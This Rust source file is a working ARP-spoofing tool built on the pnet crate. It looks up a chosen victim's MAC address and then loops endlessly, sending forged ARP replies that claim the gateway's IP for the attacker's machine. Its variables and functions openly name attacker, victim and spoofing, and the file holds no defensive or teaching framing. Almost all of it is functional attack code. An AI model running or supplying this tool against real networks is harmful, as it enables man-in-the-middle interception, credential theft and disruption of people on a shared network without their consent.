extern crate pnet;

use core::time;
use std::env;
use std::io::{self, Write};
use std::net::{AddrParseError, IpAddr, Ipv4Addr};
use std::process;
use std::thread;

use clap::Parser;

use pnet::datalink::{Channel, MacAddr, NetworkInterface, DataLinkSender, DataLinkReceiver};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::EtherTypes;
use pnet::packet::ethernet::MutableEthernetPacket;
use pnet::packet::{MutablePacket, Packet};

fn send_to(interface: &NetworkInterface, source: MacAddr, destination: MacAddr, packet: ArpPacket) {
    let (mut sender, _) = match pnet::datalink::channel(interface, Default::default()) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unknown channel type"),
        Err(e) => panic!("Error occured {}", e)
    };
    
    // Build ethernet request packet
    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    ethernet_packet.set_destination(destination);
    ethernet_packet.set_source(source);
    ethernet_packet.set_ethertype(EtherTypes::Arp);
    ethernet_packet.set_payload(packet.packet());

    // Send ethernet packet
    sender
        .send_to(ethernet_packet.packet(), None)
        .unwrap()
        .unwrap();
}

fn receive_from(interface: &NetworkInterface) -> ArpPacket {
    let (_, mut receiver) = match pnet::datalink::channel(interface, Default::default()) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unknown channel type"),
        Err(e) => panic!("Error occured {}", e)
    };

    // Wait for reply
    let buf = receiver.next().unwrap();

    let arp = ArpPacket::new(&buf[MutableEthernetPacket::minimum_packet_size()..]).unwrap();

    arp.to_immutable()
}

fn build_request_packet(target_ip: Ipv4Addr, source_mac: MacAddr, source_ip: Ipv4Addr) -> ArpPacket {
    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();

    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Request);
    arp_packet.set_sender_hw_addr(source_mac);
    arp_packet.set_sender_proto_addr(source_ip);
    arp_packet.set_target_hw_addr(MacAddr::zero());
    arp_packet.set_target_proto_addr(target_ip);

    arp_packet.to_immutable()
}

fn build_response_packet(target_mac: MacAddr, target_ip: Ipv4Addr, source_mac: MacAddr, source_ip: Ipv4Addr) -> ArpPacket {
    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();

    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Reply);
    arp_packet.set_sender_hw_addr(source_mac);
    arp_packet.set_sender_proto_addr(source_ip);
    arp_packet.set_target_hw_addr(target_mac);
    arp_packet.set_target_proto_addr(target_ip);

    arp_packet.to_immutable()
}

fn get_source_ip(interface: &NetworkInterface) -> Ipv4Addr {
    interface
        .ips
        .iter()
        .find(|ip| ip.is_ipv4())
        .map(|ip| match ip.ip() {
            IpAddr::V4(ip) => ip,
            _ => unreachable!(),
        })
        .unwrap()
}

fn request_mac(interface: &NetworkInterface, target_ip: Ipv4Addr) -> MacAddr {
    let source_mac = interface.mac.unwrap();
    let source_ip = get_source_ip(interface);

    let request = build_request_packet(target_ip, source_mac, source_ip);
    send_to(interface, source_mac, MacAddr::broadcast(), request);

    receive_from(interface).get_sender_hw_addr()
}

fn arp_spoof(interface: &NetworkInterface, attacker_mac: MacAddr, gateway_ip: Ipv4Addr, victim_mac: MacAddr, victim_ip: Ipv4Addr) {
    let response_packet = build_response_packet(victim_mac, victim_ip, attacker_mac, gateway_ip);

    send_to(interface, attacker_mac, victim_mac, response_packet);
}

fn get_interface(iface_name: String) -> NetworkInterface {
    let interfaces = pnet::datalink::interfaces();
    interfaces
        .into_iter()
        .find(|iface| iface.name == iface_name)
        .unwrap()
}

#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    #[clap(short, long)]
    victim_ip: String,

    #[clap(short, long, default_value = "en0")]
    iface_name: String,

    #[clap(short, long, default_value = "192.168.20.1")]
    gateway_ip: String,

    #[clap(short, long, default_value_t = 1)]
    repeat: u64,
}

fn main() {
    let args = Args::parse();

    let victim_ip = args.victim_ip.parse::<Ipv4Addr>().unwrap();
    let gateway_ip = args.gateway_ip.parse::<Ipv4Addr>().unwrap();

    let interface = get_interface(args.iface_name);
    
    let attacker_mac = interface.mac.unwrap();
    let victim_mac = request_mac(&interface, victim_ip);

    println!("Repeating every {} second (Ctrl+C to quit)\n", args.repeat);

    loop {
        arp_spoof(&interface, attacker_mac, gateway_ip, victim_mac, victim_ip);
        thread::sleep(time::Duration::from_secs(args.repeat));
    }
}
